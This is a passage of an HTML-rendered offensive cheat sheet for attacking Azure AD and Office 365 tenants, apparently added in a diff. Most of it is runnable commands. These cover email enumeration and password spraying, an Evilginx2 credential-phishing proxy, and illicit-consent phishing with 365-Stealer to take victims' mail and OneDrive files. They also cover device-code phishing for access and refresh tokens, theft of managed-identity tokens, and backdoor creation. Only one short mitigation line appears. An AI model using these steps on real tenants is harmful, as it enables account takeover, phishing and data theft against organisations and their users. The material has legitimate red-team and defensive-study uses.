+</span></span><span style="display:flex;"><span>$ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Contributor</span>
+</span></span><span style="display:flex;"><span>$ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command <span style="color:#e6db74">&#34;whoami&#34;</span>
+</span></span><span style="display:flex;"><span>$ Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG <span style="color:#f92672">-File</span> <span style="color:#e6db74">&#34;build.xml&#34;</span>
+</span></span><span style="display:flex;"><span>$ Get-AllSecrets <span style="color:#75715e"># AllAppSecrets, AllKeyVaultContents</span>
+</span></span><span style="display:flex;"><span>$ Get-AvailableVMDisks, Get-VMDisk <span style="color:#75715e"># Download a virtual machine&#39;s disk</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Owner</span>
+</span></span><span style="display:flex;"><span>$ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Administrator</span>
+</span></span><span style="display:flex;"><span>$ Create-Backdoor, Execute-Backdoor
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="terminology">
+  Terminology
+  <a class="anchor" href="#terminology">#</a>
+</h2>
+<blockquote>
+<p>Basic Azure AD terminologies</p>
+</blockquote>
+<ul>
+<li><strong>Tenant</strong>: An instance of Azure AD and represents a single organization.</li>
+<li><strong>Azure AD Directory</strong>: Each tenant has a dedicated Directory. This is used to perform identity and access management functions for resources.</li>
+<li><strong>Subscriptions</strong>: It is used to pay for services. There can be multiple subscriptions in a Directory.</li>
+<li><strong>Core Domain</strong>: The initial domain name <tenant>.onmicrosoft.com is the core domain. It is possible to define custom domain names too.</li>
+</ul>
+<h2 id="enumeration">
+  Enumeration
+  <a class="anchor" href="#enumeration">#</a>
+</h2>
+<h3 id="enumerate-valid-emails">
+  Enumerate valid emails
+  <a class="anchor" href="#enumerate-valid-emails">#</a>
+</h3>
+<blockquote>
+<p>By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.</p>
+</blockquote>
+<ul>
+<li>Validate email
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS&gt; C:\Python27\python.exe C:\Tools\o365creeper\o365creeper.py <span style="color:#f92672">-f</span> C:\Tools\emails.txt -o C:\Tools\validemails.txt
+</span></span><span style="display:flex;"><span>admin@&lt;TENANT NAME&gt;.onmicrosoft.com   - VALID
+</span></span><span style="display:flex;"><span>root@&lt;TENANT NAME&gt;.onmicrosoft.com    - INVALID
+</span></span><span style="display:flex;"><span>test@&lt;TENANT NAME&gt;.onmicrosoft.com    - VALID
+</span></span><span style="display:flex;"><span>contact@&lt;TENANT NAME&gt;.onmicrosoft.com - INVALID
+</span></span></code></pre></div></li>
+<li>Extract email lists with a valid credentials : 
+  <a href="https://github.com/nyxgeek/o365recon">https://github.com/nyxgeek/o365recon</a></li>
+</ul>
+<h4 id="password-spraying">
+  Password spraying
+  <a class="anchor" href="#password-spraying">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS&gt; . C:\Tools\MSOLSpray\MSOLSpray.ps1
+</span></span><span style="display:flex;"><span>PS&gt; Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password &lt;PASSWORD&gt; -Verbose
+</span></span></code></pre></div><h3 id="enumerate-azure-subdomains">
+  Enumerate Azure Subdomains
+  <a class="anchor" href="#enumerate-azure-subdomains">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS&gt; . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1
+</span></span><span style="display:flex;"><span>PS&gt; Invoke-EnumerateAzureSubDomains -Base &lt;TENANT NAME&gt; -Verbose
+</span></span><span style="display:flex;"><span>Subdomain Service
+</span></span><span style="display:flex;"><span>--------- -------
+</span></span><span style="display:flex;"><span>&lt;TENANT NAME&gt;.mail.protection.outlook.com Email
+</span></span><span style="display:flex;"><span>&lt;TENANT NAME&gt;.onmicrosoft.com Microsoft Hosted Domain
+</span></span></code></pre></div><h3 id="enumerate-tenant-with-azure-ad-powershell">
+  Enumerate tenant with Azure AD Powershell
+  <a class="anchor" href="#enumerate-tenant-with-azure-ad-powershell">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module C:\Tools\AzureAD\AzureAD.psd1
+</span></span><span style="display:flex;"><span>Import-Module C:\Tools\AzureADPreview\AzureADPreview.psd1
+</span></span><span style="display:flex;"><span>PS&gt; $passwd = ConvertTo-SecureString <span style="color:#e6db74">&#34;&lt;PASSWORD&gt;&#34;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS&gt; $creds = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#34;test@&lt;TENANT NAME&gt;.onmicrosoft.com&#34;</span>, $passwd)
+</span></span><span style="display:flex;"><span>PS Az&gt; Connect-AzureAD -Credential $creds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADUser -All $true
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADUser -All $true | select UserPrincipalName
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADGroup -All $true
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADDevice
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADDirectoryRole -Filter <span style="color:#e6db74">&#34;DisplayName eq &#39;Global Administrator&#39;&#34;</span> | Get-AzureADDirectoryRoleMember
+</span></span><span style="display:flex;"><span>PS AzureADPreview&gt; Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin <span style="color:#f92672">-eq</span> $False} | select DisplayName
+</span></span></code></pre></div><h3 id="enumerate-tenant-with-az-powershell">
+  Enumerate tenant with Az Powershell
+  <a class="anchor" href="#enumerate-tenant-with-az-powershell">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS&gt; $passwd = ConvertTo-SecureString <span style="color:#e6db74">&#34;&lt;PASSWORD&gt;&#34;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS&gt; $creds = New-Object System.Management.Automation.PSCredential (<span style="color:#e6db74">&#34;test@&lt;TENANT NAME&gt;.onmicrosoft.com&#34;</span>, $passwd)
+</span></span><span style="display:flex;"><span>PS Az&gt; Connect-AzAccount -Credential $creds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzResource
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzRoleAssignment -SignInName test@&lt;TENANT NAME&gt;.onmicrosoft.com
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzVM | fl
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzWebApp | ?{$_.Kind <span style="color:#f92672">-notmatch</span> <span style="color:#e6db74">&#34;functionapp&#34;</span>}
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzFunctionApp
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzStorageAccount | fl
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzKeyVault
+</span></span></code></pre></div><h3 id="enumerate-tenant-with-az-cli">
+  Enumerate tenant with az cli
+  <a class="anchor" href="#enumerate-tenant-with-az-cli">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS&gt; az login -u test@&lt;TENANT NAME&gt;.onmicrosoft.com -p &lt;PASSWORD&gt;
+</span></span><span style="display:flex;"><span>PS&gt; az vm list
+</span></span><span style="display:flex;"><span>PS&gt; az vm list --query <span style="color:#e6db74">&#34;[].[name]&#34;</span> -o table
+</span></span><span style="display:flex;"><span>PS&gt; az webapp list
+</span></span><span style="display:flex;"><span>PS&gt; az <span style="color:#66d9ef">function</span>app list --query <span style="color:#e6db74">&#34;[].[name]&#34;</span> -o table
+</span></span><span style="display:flex;"><span>PS&gt; az storage account list
+</span></span><span style="display:flex;"><span>PS&gt; az keyvault list
+</span></span></code></pre></div><h3 id="enumerate-manually">
+  Enumerate manually
+  <a class="anchor" href="#enumerate-manually">#</a>
+</h3>
+<ul>
+<li>Federation with Azure AD or O365
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//login.microsoftonline.com/getuserrealm.srf<span style="color:#66d9ef">?</span>login=&lt;USER&gt;@&lt;DOMAIN&gt;&amp;xml=<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//login.microsoftonline.com/getuserrealm.srf<span style="color:#66d9ef">?</span>login=root@&lt;TENANT NAME&gt;.onmicrosoft.com&amp;xml=<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div></li>
+<li>Get the Tenant ID
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//login.microsoftonline.com/&lt;DOMAIN&gt;/.well-known/openid-configuration
+</span></span><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//login.microsoftonline.com/&lt;TENANT NAME&gt;.onmicrosoft.com/.well-known/openid-configuration
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="enumeration-methodology">
+  Enumeration methodology
+  <a class="anchor" href="#enumeration-methodology">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check Azure Joined </span>
+</span></span><span style="display:flex;"><span>PS&gt; dsregcmd.exe /status
+</span></span><span style="display:flex;"><span>+----------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span>| Device State |
+</span></span><span style="display:flex;"><span>+----------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span> AzureAdJoined <span style="color:#960050;background-color:#1e0010">:</span> YES
+</span></span><span style="display:flex;"><span> EnterpriseJoined <span style="color:#960050;background-color:#1e0010">:</span> NO
+</span></span><span style="display:flex;"><span> DomainJoined <span style="color:#960050;background-color:#1e0010">:</span> NO
+</span></span><span style="display:flex;"><span> Device Name <span style="color:#960050;background-color:#1e0010">:</span> jumpvm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enumerate resources</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzResource
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enumerate role assignments</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzRoleAssignment -Scope /subscriptions/&lt;SUBSCRIPTION-ID&gt;/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/&lt;VM-NAME&gt;`
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get info on a role</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzRoleDefinition -Name <span style="color:#e6db74">&#34;Virtual Machine Command Executor&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get info user</span>
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADUser -ObjectId &lt;ID&gt;
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADUser -ObjectId test@&lt;TENANT NAME&gt;.onmicrosoft.com | fl * 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List all groups</span>
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADGroup -All $true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get members of a group</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzADGroup -DisplayName <span style="color:#e6db74">&#39;&lt;GROUP-NAME&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzADGroupMember -GroupDisplayName <span style="color:#e6db74">&#39;&lt;GROUP-NAME&gt;&#39;</span> | select UserPrincipalName
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get Azure AD information</span>
+</span></span><span style="display:flex;"><span>PS&gt; Import-Module C:\Tools\AADInternals\AADInternals.psd1
+</span></span><span style="display:flex;"><span>PS AADInternals&gt; Get-AADIntLoginInformation -UserName admin@&lt;TENANT NAME&gt;.onmicrosoft.com
+</span></span><span style="display:flex;"><span>PS AADInternals&gt; Get-AADIntTenantID -Domain &lt;TENANT NAME&gt;.onmicrosoft.com <span style="color:#75715e"># Get Tenant ID</span>
+</span></span><span style="display:flex;"><span>PS AADInternals&gt; Invoke-AADIntReconAsOutsider -DomainName &lt;DOMAIN&gt; <span style="color:#75715e"># Get all the information</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if there is a user logged-in to az cli</span>
+</span></span><span style="display:flex;"><span>PS&gt; az ad signed-in-user show
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check AppID Alternative Names/Display Name </span>
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADServicePrincipal -All $True | ?{$_.AppId <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;&lt;APP-ID&gt;&#34;</span>} | fl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get all application objects registered using the current tenant</span>
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADApplication -All $true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get all details about an application</span>
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADApplication -ObjectId &lt;ID&gt; | fl *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List all VM&#39;s the user has access to</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzVM 
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzVM | fl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get all function apps</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzFunctionApp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get all webapps</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzWebApp
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzWebApp | select-object Name, Type, Hostnames
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List all storage accounts</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzStorageAccount
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzStorageAccount | fl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List all keyvaults</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzKeyVault
+</span></span></code></pre></div><h2 id="phishing-with-evilginx2">
+  Phishing with Evilginx2
+  <a class="anchor" href="#phishing-with-evilginx2">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Tools&gt; evilginx2 -p C:\Tools\evilginx2\phishlets
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:</span> config domain username.corp
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:</span> config ip <span style="color:#ae81ff">10.10</span>.10.10
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:</span> phishlets hostname o365 login.username.corp
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:</span> phishlets get-hosts o365
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Create a DNS entry <span style="color:#66d9ef">for</span> login.login.username.corp and www.login.username.corp, type A, pointing to your machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># copy certificate and enable the phishing</span>
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:</span> phishlets enable o365
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the phishing URL</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:</span> lures create o365
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:</span> lures get-url <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><h2 id="illicit-consent-grant">
+  Illicit Consent Grant
+  <a class="anchor" href="#illicit-consent-grant">#</a>
+</h2>
+<blockquote>
+<p>The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to.</p>
+</blockquote>
+<p>Check if users are allowed to consent to apps: <code>PS AzureADPreview&gt; (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole</code></p>
+<ul>
+<li><strong>Disable user consent</strong> : Users cannot grant permissions to applications.</li>
+<li><strong>Users can consent to apps from verified publishers or your organization, but only for permissions you select</strong> : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant</li>
+<li><strong>Users can consent to all apps</strong> : allows all users to consent to any permission which doesn&rsquo;t require admin consent,</li>
+<li><strong>Custom app consent policy</strong></li>
+</ul>
+<h3 id="register-application">
+  Register Application
+  <a class="anchor" href="#register-application">#</a>
+</h3>
+<ol>
+<li>Login to 
+  <a href="https://portal.azure.com">https://portal.azure.com</a> &gt; Azure Active Directory</li>
+<li>Click on <strong>App registrations</strong> &gt; <strong>New registration</strong></li>
+<li>Enter the Name for our application</li>
+<li>Under support account types select <strong>&ldquo;Accounts in any organizational directory (Any Azure AD directory - Multitenant)&rdquo;</strong></li>
+<li>Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is <code>https://&lt;DOMAIN/IP&gt;:&lt;PORT&gt;/login/authorized</code>.</li>
+<li>Click <strong>Register</strong> and save the <strong>Application ID</strong></li>
+</ol>
+<h3 id="configure-application">
+  Configure Application
+  <a class="anchor" href="#configure-application">#</a>
+</h3>
+<ol>
+<li>Click on <code>Certificates &amp; secrets</code></li>
+<li>Click on <code>New client secret</code> then enter the <strong>Description</strong> and click on <strong>Add</strong>.</li>
+<li>Save the <strong>secret</strong>&rsquo;s value.</li>
+<li>Click on API permissions &gt; Add a permission</li>
+<li>Click on Microsoft Graph &gt; <strong>Delegated permissions</strong></li>
+<li>Search and select the below mentioned permissions and click on Add permission
+<ul>
+<li>Contacts.Read</li>
+<li>Mail.Read / Mail.ReadWrite</li>
+<li>Mail.Send</li>
+<li>Notes.Read.All</li>
+<li>Mailboxsettings.ReadWrite</li>
+<li>Files.ReadWrite.All</li>
+<li>User.ReadBasic.All</li>
+<li>User.Read</li>
+</ul>
+</li>
+</ol>
+<h3 id="setup-365-stealer-deprecated">
+  Setup 365-Stealer (Deprecated)
+  <a class="anchor" href="#setup-365-stealer-deprecated">#</a>
+</h3>
+<p>:warning: Default port for 365-Stealer phishing is 443</p>
+<ul>
+<li>Run XAMPP and start Apache</li>
+<li>Clone 365-Stealer into <code>C:\xampp\htdocs\</code>
+<ul>
+<li><code>git clone https://github.com/AlteredSecurity/365-Stealer.git</code></li>
+</ul>
+</li>
+<li>Install the requirements
+<ul>
+<li>Python3</li>
+<li>PHP CLI or Xampp server</li>
+<li><code>pip install -r requirements.txt</code></li>
+</ul>
+</li>
+<li>Enable sqlite3 (Xampp &gt; Apache config &gt; php.ini) and restart Apache</li>
+<li>Edit <code>C:/xampp/htdocs/yourvictims/index.php</code> if needed
+<ul>
+<li>Disable IP whitelisting <code>$enableIpWhiteList = false;</code></li>
+</ul>
+</li>
+<li>Go to 365-Stealer Management portal &gt; Configuration (http://localhost:82/365-stealer/yourVictims)
+<ul>
+<li><strong>Client Id</strong> (Mandatory): This will be the Application(Client) Id of the application that we registered.</li>
+<li><strong>Client Secret</strong> (Mandatory): Secret value from the Certificates &amp; secrets tab that we created.</li>
+<li><strong>Redirect URL</strong> (Mandatory): Specify the redirect URL that we entered during registering the App like <code>https://&lt;Domain/IP&gt;/login/authorized</code></li>
+<li><strong>Macros Location</strong>: Path of macro file that we want to inject.</li>
+<li><strong>Extension in OneDrive</strong>: We can provide file extensions that we want to download from the victims account or provide <code>*</code> to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc.</li>
+<li><strong>Delay</strong>: Delay the request by specifying time in seconds while stealing</li>
+</ul>
+</li>
+<li>Create a Self Signed Certificate to use HTTPS</li>
+<li>Run the application either click on the button or run this command : <code>python 365-Stealer.py --run-app</code>
+<ul>
+<li><code>--no-ssl</code>: disable HTTPS</li>
+<li><code>--port</code>: change the default listening port</li>
+<li><code>--token</code>: provide a specific token</li>
+<li><code>--refresh-token XXX --client-id YYY --client-secret ZZZ</code>: use a refresh token</li>
+</ul>
+</li>
+<li>Find the Phishing URL: go to <code>https://&lt;IP/Domain&gt;:&lt;Port&gt;</code> and click on <strong>Read More</strong> button or in the console.</li>
+</ul>
+<h3 id="setup-vajra">
+  Setup Vajra
+  <a class="anchor" href="#setup-vajra">#</a>
+</h3>
+<blockquote>
+<p>Vajra is a UI-based tool with multiple techniques for attacking and enumerating in the target&rsquo;s Azure environment. It features an intuitive web-based user interface built with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking techniques all at one place with web UI interfaces. - 
+  <a href="https://github.com/TROUBLE-1/Vajra">https://github.com/TROUBLE-1/Vajra</a></p>
+</blockquote>
+<p><strong>Mitigation</strong>: Enable <code>Do not allow user consent</code> for applications in the &ldquo;Consent and permissions menu&rdquo;.</p>
+<h2 id="device-code-phish">
+  Device Code Phish
+  <a class="anchor" href="#device-code-phish">#</a>
+</h2>
+<p>Requirements:</p>
+<ul>
+<li>Azure AD / Office 365 E3 Subscription</li>
+</ul>
+<p>Exploitation:</p>
+<ul>
+<li>Import TokenTactics: <code>PS C:\TokenTactics&gt; Import-Module .\TokenTactics.psd1</code></li>
+<li>Request a device code for the Azure Graph API using TokenTactics: <code>Get-AzureToken -Client Graph</code></li>
+<li>Replace <code>&lt;REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS&gt;</code> in the 
+  <a href="https://github.com/rvrsh3ll/TokenTactics/blob/main/resources/DeviceCodePhishingEmailTemplate.oft">phishing email</a></li>
+<li>Leave TokenTactics running in the PowerShell window and send the phishing email</li>
+<li>Targeted user will follow the link to 
+  <a href="https://microsoft.com/devicelogin">https://microsoft.com/devicelogin</a> and complete the Device Code form</li>
+<li>Enjoy your <strong>Access Token</strong> &amp; <strong>Refresh Token</strong></li>
+</ul>
+<h2 id="token-from-managed-identity">
+  Token from Managed Identity
+  <a class="anchor" href="#token-from-managed-identity">#</a>
+</h2>
+<blockquote>
+<p><strong>MSI_ENDPOINT</strong> is an alias for <strong>IDENTITY_ENDPOINT</strong>, and <strong>MSI_SECRET</strong> is an alias for <strong>IDENTITY_HEADER</strong>.</p>
+</blockquote>
+<p>Find IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : <code>env</code></p>
+<p>Most of the time, you want a token for one of these resources:</p>
+<ul>
+<li>
+  <a href="https://storage.azure.com">https://storage.azure.com</a></li>
+<li>
+  <a href="https://vault.azure.net">https://vault.azure.net</a></li>
+<li>
+  <a href="https://graph.microsoft.com">https://graph.microsoft.com</a></li>
+<li>
+  <a href="https://management.azure.com">https://management.azure.com</a></li>
+</ul>
+<h3 id="azure-api-via-powershell">
+  Azure API via Powershell
+  <a class="anchor" href="#azure-api-via-powershell">#</a>
+</h3>
+<p>Get <strong>access_token</strong> from <strong>IDENTITY_HEADER</strong> and <strong>IDENTITY_ENDPOINT</strong>: <code>system('curl &quot;$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-version=2017-09-01&quot; -H secret:$IDENTITY_HEADER');</code>.</p>
+<p>Then query the Azure REST API to get the <strong>subscription ID</strong> and more .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$Token = <span style="color:#e6db74">&#39;eyJ0eX..&#39;</span>
+</span></span><span style="display:flex;"><span>$URI = <span style="color:#e6db74">&#39;https://management.azure.com/subscriptions?api-version=2020-01-01&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># $URI = &#39;https://graph.microsoft.com/v1.0/applications&#39;</span>
+</span></span><span style="display:flex;"><span>$RequestParams = @{
+</span></span><span style="display:flex;"><span> Method = <span style="color:#e6db74">&#39;GET&#39;</span>
+</span></span><span style="display:flex;"><span> Uri = $URI
+</span></span><span style="display:flex;"><span> Headers = @{
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;Authorization&#39;</span> = <span style="color:#e6db74">&#34;Bearer </span>$Token<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>(Invoke-RestMethod @RequestParams).value 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List resources and check for runCommand privileges</span>
+</span></span><span style="display:flex;"><span>$URI = <span style="color:#e6db74">&#39;https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01&#39;</span>
+</span></span><span style="display:flex;"><span>$URI = <span style="color:#e6db74">&#39;https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/&lt;RG-NAME&gt;/providers/Microsoft.Compute/virtualMachines/&lt;RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01&#39;</span>
+</span></span></code></pre></div><h3 id="azure-api-via-python-version">
+  Azure API via Python Version
+  <a class="anchor" href="#azure-api-via-python-version">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>IDENTITY_ENDPOINT <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;IDENTITY_ENDPOINT&#39;</span>]
+</span></span><span style="display:flex;"><span>IDENTITY_HEADER <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;IDENTITY_HEADER&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Management API&#34;</span>)
+</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;curl &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">?resource=https://management.azure.com/&amp;api-version=2017-09-01&#34; -H secret:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(cmd)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Access Token: &#34;</span><span style="color:#f92672">+</span>json<span style="color:#f92672">.</span>loads(val)[<span style="color:#e6db74">&#34;access_token&#34;</span>])
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;ClientID/AccountID: &#34;</span><span style="color:#f92672">+</span>json<span style="color:#f92672">.</span>loads(val)[<span style="color:#e6db74">&#34;client_id&#34;</span>])
+</span></span><span style="display:flex;"><span>
